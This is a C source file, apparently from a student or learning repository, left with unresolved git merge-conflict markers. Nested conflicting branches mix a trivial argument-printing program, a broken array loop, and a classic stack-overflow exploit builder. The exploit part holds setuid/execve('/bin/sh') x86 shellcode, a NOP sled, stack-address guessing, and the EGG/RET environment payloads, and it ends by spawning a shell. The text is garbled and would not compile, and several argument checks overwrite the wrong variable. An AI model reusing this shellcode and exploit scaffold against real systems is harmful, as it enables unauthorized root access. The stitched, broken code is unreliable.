#include <stdio.h>
#include <stdlib.h>
#include <string.h>

<<<<<<< Updated upstream
<<<<<<< HEAD
void ComplexFunc(double num1, double num2){
        printf("%f + %f = %f ", num1, num2, num1+num2);
}

int main(int argc, char * argv[]){
    
    printf("Argc : %d\n", argc);
    printf("Argv[0] : %s\n", argv[0]);
    printf("Argv[1] : %s\n", argv[1]);
=======
int main(){
    int * arr[5];
    int x = 1;
    for(int i = 0; i<5; ++i){
        for(int j = 0; j<5; ++j){
            arr[i][j] = x;
            x++;
        }
=======
#define DEFAULT_OFFSET 0 
#define DEFAULT_BUFFER_SIZE 532
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char shellcode[] = 
	"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80" 
	"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46" 
	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89" 
	"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" 
	"\x00\xc9\xc3\x90/bin/sh";

unsigned long get_esp(void){
    __asm__("movl %esp, %eax");
}

void main(int argc, char * argv[]){
    char * buff, *ptr, *egg;
    long * addr_ptr, addr;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i, eggsize = DEFAULT_EGG_SIZE;
    if(argc>1)bsize = atoi(argv[1]);
    if(argc>2)bsize = atoi(argv[2]);
    if(argc>3)bsize = atoi(argv[3]);
    if(!(buff = malloc(bsize))){
        printf("Can't allocate memory\n");
        exit(0);
    }
    if(!(egg=malloc(eggsize))){
        printf("Can't allocate memory\n");
        exit(0);
>>>>>>> Stashed changes
    }
 
    addr = get_esp() - offset;
    printf("Using address : 0x%x\n", addr);
    ptr = buff;
    addr_ptr = (long*) ptr;

    for(i = 0; i<bsize; i+=4){
        *(addr_ptr++) = addr;
    }

    ptr = egg;

    for(i = 0; i< eggsize - strlen(shellcode) - 1; i++){
        *(ptr++) = NOP;
    }

    for(i = 0; i< strlen(shellcode); i++){
        *(ptr++) = shellcode[i];
    }
>>>>>>> fa88b5a5a8f5a3731a578976f113142c7c791af9

    buff[bsize - 1] = '\0';
    egg[eggsize - 1] = '\0';
    memcpy(egg, "EGG=", 4);
    putenv(egg);
    memcpy(buff, "RET=", 4);
    putenv(buff);
    system("/bin/bash");
}